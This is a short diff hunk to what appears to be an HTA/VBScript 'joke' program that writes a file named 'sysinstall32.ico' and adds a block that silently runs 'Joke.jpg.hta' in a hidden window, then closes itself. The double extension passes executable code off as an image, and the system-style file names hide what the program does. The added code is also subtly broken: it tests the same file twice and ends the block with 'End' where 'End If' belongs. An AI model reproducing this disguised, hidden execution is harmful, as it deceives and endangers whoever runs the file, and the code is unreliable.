@@ -60,6 +60,11 @@
         .savetofile WshShell.CurrentDirectory & "\sysinstall32.ico", 2
     End With
     
+    If fso.FileExists("syserror.mp3") or fso.FileExists("syserror.mp3") Then
+    	Return = WshShell.Run("Joke.jpg.hta", 0, false)
+    	window.close
+    End
+    
     Rem Functions and Initialization
     Rem Wait function since the sleep function doesn't work in HTA
     Sub wait(milliseconds)
